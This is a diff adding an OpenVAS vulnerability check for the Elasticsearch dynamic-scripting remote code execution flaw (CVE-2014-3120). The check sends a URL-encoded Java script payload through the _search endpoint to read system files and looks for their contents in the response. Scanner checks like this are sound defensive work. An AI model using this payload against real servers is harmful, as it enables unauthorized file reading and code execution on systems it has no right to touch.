@@ -1,0 +1,111 @@
+###############################################################################
+# OpenVAS Vulnerability Test
+# $Id: gb_elastisearch_code_execution_05_14.nasl 5081 2017-01-24 11:05:06Z cfi $
+#
+# Elastisearch Remote Code Execution Vulnerability
+#
+# Authors:
+# Michael Meyer <michael.meyer@greenbone.net>
+#
+# Copyright:
+# Copyright (c) 2014 Greenbone Networks GmbH
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License
+# as published by the Free Software Foundation; either version 2
+# of the License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
+###############################################################################
+
+tag_insight = "Elasticsearch has a flaw in its default configuration which makes
+it possible for any webpage to execute arbitrary code on visitors with
+Elasticsearch installed.";
+
+tag_impact = "An attacker can exploit this issue to execute arbitrary code";
+tag_affected = "Elasticsearch < 1.2";
+
+tag_summary = "Elasticsearch is prone to a remote-code-execution vulnerability.";
+
+tag_solution = "Ask the vendor for an update or disable 'dynamic scripting'";
+tag_vuldetect = "Send a special crafted HTTP GET request and check the response";
+
+if (description)
+{
+ script_oid("1.3.6.1.4.1.25623.1.0.105032");
+ script_cve_id("CVE-2014-3120");
+ script_tag(name:"cvss_base", value:"6.8");
+ script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
+ script_version ("$Revision: 5081 $");
+
+ script_name("Elastisearch Remote Code Execution Vulnerability");
+
+
+ script_xref(name:"URL", value:"http://bouk.co/blog/elasticsearch-rce/");
+ 
+ script_tag(name:"last_modification", value:"$Date: 2017-01-24 12:05:06 +0100 (Tue, 24 Jan 2017) $");
+ script_tag(name:"creation_date", value:"2014-05-22 15:28:00 +0200 (Thu, 22 May 2014)");
+ script_category(ACT_GATHER_INFO);
+ script_tag(name:"qod_type", value:"remote_vul");
+ script_family("Web application abuses");
+ script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
+ script_dependencies("gb_elastsearch_detect.nasl","os_detection.nasl");
+ script_require_ports("Services/www", 9200);
+ script_exclude_keys("Settings/disable_cgi_scanning");
+ script_mandatory_keys("elastisearch/installed");
+
+ script_tag(name : "impact" , value : tag_impact);
+ script_tag(name : "vuldetect" , value : tag_vuldetect);
+ script_tag(name : "insight" , value : tag_insight);
+ script_tag(name : "solution" , value : tag_solution);
+ script_tag(name : "summary" , value : tag_summary);
+ script_tag(name : "affected" , value : tag_affected);
+
+ exit(0);
+}
+
+include("host_details.inc");
+include("http_func.inc");
+include("http_keepalive.inc");
+include("url_func.inc");
+
+port = get_http_port( default:9200 );
+if( ! get_port_state( port ) ) exit (0);
+
+if( ! get_kb_item("www/" + port + "/elastisearch") ) exit( 0 );
+
+files = traversal_files();
+
+foreach file ( keys( files ) )
+{
+  lf = str_replace( string:files[file], find:"\\", replace:"/");
+  lf = str_replace( string:files[file], find:"/", replace:"%2F");
+
+  ex = '%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22' + 
+       'match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22OpenVAS%22%3A%7B' +
+       '%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20'  + 
+       'Scanner(new%20File(%5C%22%2F' + lf + '%5C%22)).useDelimiter(%5C%22%5C%5C%5C' + 
+       '%5CZ%5C%22).next()%3B%22%7D%7D%7D';
+
+  url = '/_search?source=' + ex + '&callback=?';
+
+  req = http_get( item:url, port:port );
+  buf = http_send_recv( port:port, data:req, bodyonly:FALSE );
+
+  if( "OpenVAS" >< buf &&  egrep( pattern:file, string: buf ) )
+  {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }  
+
+}
+exit( 99 );
+
